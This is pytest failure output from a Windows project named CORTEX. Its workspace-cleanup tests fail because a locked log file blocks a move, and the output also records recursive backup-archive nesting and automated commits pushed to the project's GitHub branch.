INFO     src.operations:__init__.py:127 Executing operation: workspace_cleanup (profile: safe)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for workspace_cleanup with 1 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Workspace Cleanup (workspace_cleanup) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 1\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['cleanup_orchestrator']\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: cleanup_orchestrator (Cleanup Orchestrator)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: processing, Priority: 100\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:194 ======================================================================\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:195 CORTEX CLEANUP ORCHESTRATOR\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:196 ======================================================================\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:212 Profile: safe\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:213 Dry Run: False\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:214 Project Root: D:\\PROJECTS\\CORTEX\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:215 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:218 Phase 1: Safety Verification\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:219 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:228 \u2705 Safety verified: All 26 protected paths verified\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:229 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:240 Phase 3: Root Folder Cleanup\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:241 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:438 Scanning root folder...\nERROR    src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:331 Cleanup orchestrator failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nTraceback (most recent call last):\n  File "C:\\Users\\asifh\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\shutil.py", line 856, in move\n    os.rename(src, real_dst)\n    ~~~~~~~~~^^^^^^^^^^^^^^^\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log' -> 'D:\\\\PROJECTS\\\\CORTEX\\\\scripts\\\\temp\\\\test_timing.log'\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File "D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py", line 242, in execute\n    self._cleanup_root_folder(dry_run)\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^\n  File "D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py", line 466, in _cleanup_root_folder\n    shutil.move(str(file_path), str(dest_path))\n    ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File "C:\\Users\\asifh\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\shutil.py", line 877, in move\n    os.unlink(src)\n    ~~~~~~~~~^^^^^\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:230 Module cleanup_orchestrator failed: Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:235 Required module cleanup_orchestrator failed, rolling back\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:367 Rolling back executed modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:374 Rolling back module: cleanup_orchestrator\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Workspace Cleanup finished in 0.01s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
__________ test_cleanup_standard_profile_removes_old_logs_and_cache ___________
tests\operations\test_workspace_cleanup.py:77: in test_cleanup_standard_profile_removes_old_logs_and_cache
    assert report.success is True
E   assert False is True
E    +  where False = OperationExecutionReport(operation_id='workspace_cleanup', operation_name='Workspace Cleanup', success=False, modules_executed=['cleanup_orchestrator'], modules_succeeded=[], modules_failed=['cleanup_orchestrator'], modules_skipped=[], module_results={'cleanup_orchestrator': OperationResult(success=False, status=<OperationStatus.FAILED: 'failed'>, message="Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'", data={'error': "[WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'"}, errors=[], warnings=[], duration_seconds=0.0, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 40, 689383), execution_mode=<ExecutionMode.LIVE: 'live'>, formatted_header=None, formatted_footer=None)}, total_duration_seconds=14.990345, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 40, 689595), context={'project_root': WindowsPath('C:/Windows/Temp/pytest-of-asifh/pytest-104/test_cleanup_standard_profile_0/cortex_sandbox'), 'profile': 'standard', 'execution_mode': <ExecutionMode.LIVE: 'live'>}, errors=[]).success
---------------------------- Captured stdout call -----------------------------
\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX Cleanup Orchestrator v1.0.0\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nProfile: standard  \u2502  Mode: LIVE EXECUTION  \u2502  Started: 2025-11-11 12:42:25\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n[CORTEX-2.0 f724e86] Archive 13 backup files before cleanup - 20251111-124237\n 13 files changed, 164 insertions(+)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/.venv/Lib/site-packages/material/templates/.icons/material/backup-restore.svg (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/.venv/Lib/site-packages/material/templates/.icons/simple/borgbackup.svg (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/.venv/Lib/site-packages/numpy/ma/tests/test_old_ma.py (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090618.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090639.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090658.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090712.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-103737.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-105821.json (100%)\n rename .backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-105838.json (100%)\n rename .backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-123550.json (100%)\n create mode 100644 .backup-archive/.backup-archive/backup-manifest-20251111-123617.json\n create mode 100644 .backup-archive/backup-manifest-20251111-124237.json
---------------------------- Captured stderr call -----------------------------
Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Apps > Advanced app settings > App execution aliases.

To https://github.com/asifhussain60/CORTEX.git
   f7f1ce3..f724e86  CORTEX-2.0 -> CORTEX-2.0
------------------------------ Captured log call ------------------------------
INFO     src.operations:__init__.py:127 Executing operation: workspace_cleanup (profile: standard)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for workspace_cleanup with 1 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Workspace Cleanup (workspace_cleanup) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 1\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['cleanup_orchestrator']\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: cleanup_orchestrator (Cleanup Orchestrator)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: processing, Priority: 100\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:194 ======================================================================\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:195 CORTEX CLEANUP ORCHESTRATOR\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:196 ======================================================================\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:212 Profile: standard\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:213 Dry Run: False\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:214 Project Root: D:\\PROJECTS\\CORTEX\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:215 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:218 Phase 1: Safety Verification\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:219 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:228 \u2705 Safety verified: All 26 protected paths verified\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:229 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:233 Phase 2: Backup Management\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:234 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:389 Scanning for backup files...\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:405 Found 13 backup files\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:786 Archived 13 backups to GitHub (commit: f724e865)\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:412 \u2705 Archived 13 backups to GitHub\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:236 \u2705 13 backups processed\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:237 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:240 Phase 3: Root Folder Cleanup\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:241 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:438 Scanning root folder...\nERROR    src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:331 Cleanup orchestrator failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nTraceback (most recent call last):\n  File "C:\\Users\\asifh\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\shutil.py", line 856, in move\n    os.rename(src, real_dst)\n    ~~~~~~~~~^^^^^^^^^^^^^^^\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log' -> 'D:\\\\PROJECTS\\\\CORTEX\\\\scripts\\\\temp\\\\test_timing.log'\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File "D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py", line 242, in execute\n    self._cleanup_root_folder(dry_run)\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^\n  File "D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py", line 466, in _cleanup_root_folder\n    shutil.move(str(file_path), str(dest_path))\n    ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File "C:\\Users\\asifh\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\shutil.py", line 877, in move\n    os.unlink(src)\n    ~~~~~~~~~^^^^^\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:230 Module cleanup_orchestrator failed: Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:235 Required module cleanup_orchestrator failed, rolling back\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:367 Rolling back executed modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:374 Rolling back module: cleanup_orchestrator\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Workspace Cleanup finished in 14.99s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
_________________ test_cleanup_vacuums_databases_when_present _________________
tests\operations\test_workspace_cleanup.py:95: in test_cleanup_vacuums_databases_when_present
    assert report.success is True
E   assert False is True
E    +  where False = OperationExecutionReport(operation_id='workspace_cleanup', operation_name='Workspace Cleanup', success=False, modules_executed=['cleanup_orchestrator'], modules_succeeded=[], modules_failed=['cleanup_orchestrator'], modules_skipped=[], module_results={'cleanup_orchestrator': OperationResult(success=False, status=<OperationStatus.FAILED: 'failed'>, message="Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'", data={'error': "[WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'"}, errors=[], warnings=[], duration_seconds=0.0, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 49, 989600), execution_mode=<ExecutionMode.LIVE: 'live'>, formatted_header=None, formatted_footer=None)}, total_duration_seconds=9.264361, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 49, 989983), context={'project_root': WindowsPath('C:/Windows/Temp/pytest-of-asifh/pytest-104/test_cleanup_vacuums_databases0/cortex_sandbox'), 'profile': 'standard', 'execution_mode': <ExecutionMode.LIVE: 'live'>}, errors=[]).success
---------------------------- Captured stdout call -----------------------------
\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX Cleanup Orchestrator v1.0.0\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nProfile: standard  \u2502  Mode: LIVE EXECUTION  \u2502  Started: 2025-11-11 12:42:40\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n[CORTEX-2.0 0292aa8] Archive 14 backup files before cleanup - 20251111-124247\n 14 files changed, 158 insertions(+), 2 deletions(-)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/.venv/Lib/site-packages/numpy/ma/tests/test_old_ma.py (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090618.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090639.json (100%)\n delete mode 100644 .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.venv/Lib/site-packages/material/templates/.icons/material/backup-restore.svg\n delete mode 100644 .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.venv/Lib/site-packages/material/templates/.icons/simple/borgbackup.svg\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090658.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-090712.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-103737.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-105821.json (100%)\n rename .backup-archive/.backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-105838.json (100%)\n rename .backup-archive/.backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-123550.json (100%)\n rename .backup-archive/{ => .backup-archive/.backup-archive}/backup-manifest-20251111-123617.json (100%)\n create mode 100644 .backup-archive/.backup-archive/backup-manifest-20251111-124237.json\n create mode 100644 .backup-archive/backup-manifest-20251111-124247.json
---------------------------- Captured stderr call -----------------------------
Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Apps > Advanced app settings > App execution aliases.

To https://github.com/asifhussain60/CORTEX.git
   f724e86..0292aa8  CORTEX-2.0 -> CORTEX-2.0
------------------------------ Captured log call ------------------------------
INFO     src.operations:__init__.py:127 Executing operation: workspace_cleanup (profile: standard)\nINFO     src.operations.operation_factory:operation_factory.py:243 Created orchestrator for workspace_cleanup with 1 modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:168 Starting operation: Workspace Cleanup (workspace_cleanup) - LIVE mode\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:169 Modules to execute: 1\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:182 Module execution order: ['cleanup_orchestrator']\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:213 Executing module: cleanup_orchestrator (Cleanup Orchestrator)\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:214   Phase: processing, Priority: 100\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:194 ======================================================================\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:195 CORTEX CLEANUP ORCHESTRATOR\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:196 ======================================================================\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:212 Profile: standard\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:213 Dry Run: False\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:214 Project Root: D:\\PROJECTS\\CORTEX\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:215 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:218 Phase 1: Safety Verification\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:219 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:228 \u2705 Safety verified: All 26 protected paths verified\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:229 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:233 Phase 2: Backup Management\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:234 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:389 Scanning for backup files...\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:405 Found 14 backup files\nWARNING  src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:760 Failed to copy backup D:\\PROJECTS\\CORTEX\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.venv\\Lib\\site-packages\\numpy\\ma\\tests\\__pycache__\\test_old_ma.cpython-313.pyc: [WinError 3] The system cannot find the path specified\nWARNING  src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:760 Failed to copy backup D:\\PROJECTS\\CORTEX\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.venv\\Lib\\site-packages\\material\\templates\\.icons\\material\\backup-restore.svg: [WinError 206] The filename or extension is too long: 'D:\\\\PROJECTS\\\\CORTEX\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.venv\\\\Lib\\\\site-packages\\\\material\\\\templates\\\\.icons\\\\material'\nWARNING  src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:760 Failed to copy backup D:\\PROJECTS\\CORTEX\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.backup-archive\\.venv\\Lib\\site-packages\\material\\templates\\.icons\\simple\\borgbackup.svg: [WinError 206] The filename or extension is too long: 'D:\\\\PROJECTS\\\\CORTEX\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.backup-archive\\\\.venv\\\\Lib\\\\site-packages\\\\material\\\\templates\\\\.icons\\\\simple'\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:786 Archived 14 backups to GitHub (commit: 0292aa84)\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:412 \u2705 Archived 11 backups to GitHub\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:236 \u2705 14 backups processed\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:237 \nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:240 Phase 3: Root Folder Cleanup\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:241 ----------------------------------------------------------------------\nINFO     src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:438 Scanning root folder...\nERROR    src.operations.modules.cleanup.cleanup_orchestrator:cleanup_orchestrator.py:331 Cleanup orchestrator failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nTraceback (most recent call last):\n  File "C:\\Users\\asifh\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\shutil.py", line 856, in move\n    os.rename(src, real_dst)\n    ~~~~~~~~~^^^^^^^^^^^^^^^\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log' -> 'D:\\\\PROJECTS\\\\CORTEX\\\\scripts\\\\temp\\\\test_timing.log'\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File "D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py", line 242, in execute\n    self._cleanup_root_folder(dry_run)\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^\n  File "D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py", line 466, in _cleanup_root_folder\n    shutil.move(str(file_path), str(dest_path))\n    ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File "C:\\Users\\asifh\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\shutil.py", line 877, in move\n    os.unlink(src)\n    ~~~~~~~~~^^^^^\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:230 Module cleanup_orchestrator failed: Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'\nERROR    src.operations.operations_orchestrator:operations_orchestrator.py:235 Required module cleanup_orchestrator failed, rolling back\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:367 Rolling back executed modules\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:374 Rolling back module: cleanup_orchestrator\nINFO     src.operations.operations_orchestrator:operations_orchestrator.py:276 Operation Workspace Cleanup finished in 9.26s\nWARNING  src.operations.operations_orchestrator:operations_orchestrator.py:284 Failed to capture learning: capture_operation_learning() missing 2 required positional arguments: 'result' and 'context'
______________ TestGitHubArchival.test_archive_backups_to_github ______________
tests\plugins\test_cleanup_plugin.py:539: in test_archive_backups_to_github
    assert cleanup_plugin.stats.files_scanned > 0
E   assert 0 > 0
